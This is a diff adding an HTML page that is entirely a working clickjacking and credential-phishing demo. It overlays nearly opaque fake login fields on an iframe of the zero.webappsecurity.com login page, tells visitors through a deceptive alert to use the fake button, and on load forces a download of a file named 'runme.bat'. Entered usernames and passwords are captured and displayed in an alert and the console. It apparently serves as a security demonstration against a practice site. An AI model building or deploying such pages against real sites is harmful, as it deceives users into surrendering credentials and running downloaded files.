@@ -1,0 +1,78 @@
+<html>
+    <head>
+        <style>
+            #container {
+                position: relative;
+                width: 1000px;
+                height: 1000px;
+            }
+            #top-evil {
+                position: absolute;
+                width: 1000px;
+                height: 1000px;
+                opacity: 0.95; 
+                z-index: 2;
+                top: 0;
+                left: 0;
+            }
+            #bottom-victim {
+                position: absolute;
+                width: 1500px;
+                height: 1500px;
+                z-index: 1;
+                top: 0;
+                left: 0;
+                pointer-events: none; 
+            }
+            #unamefake {
+                height: 30px;
+                width: 220px;
+                margin-top: 183px;
+                margin-left: 639px;
+            }
+            #passfake {
+                height: 30px;
+                width: 220px;
+                margin-top: 18px;
+                margin-left: 639px;
+            }
+            #btn {
+                margin-top: 21px;
+                margin-right: 20px;
+            }
+        </style>
+    </head>
+    <body onload="onLoad(); initiateDownload();">
+        <script>
+            function onLoad() {
+                alert("Please use the white Sign in button, we are facing issues with the blue button.");
+            }
+            
+            function initiateDownload() {
+            const link = document.createElement('a');
+            link.href = 'runme.bat'; 
+            link.download = 'runme.bat';
+            link.click();
+            }
+            document.addEventListener("DOMContentLoaded", function() {
+                document.getElementById("btn").addEventListener("click", function() {
+                    const user = document.getElementById("unamefake").value;
+                    const password = document.getElementById("passfake").value;
+
+                    console.log("Username:", user);
+                    console.log("Password:", password);
+
+                    alert("Your credentials have been hijacked!"+"\nUsername: " + user + "\nPassword: " + password);
+                });
+            });
+        </script>
+        <div id="container">
+            <div id="top-evil">
+                <input required="required" id="unamefake"/>
+                <input type="password" required="required" id="passfake"/> 
+                <input type="button" id="btn" value="Sign in"/>
+            </div>
+            <iframe id="bottom-victim" src="http://zero.webappsecurity.com/login.html"></iframe>
+        </div> 
+    </body>
+</html>
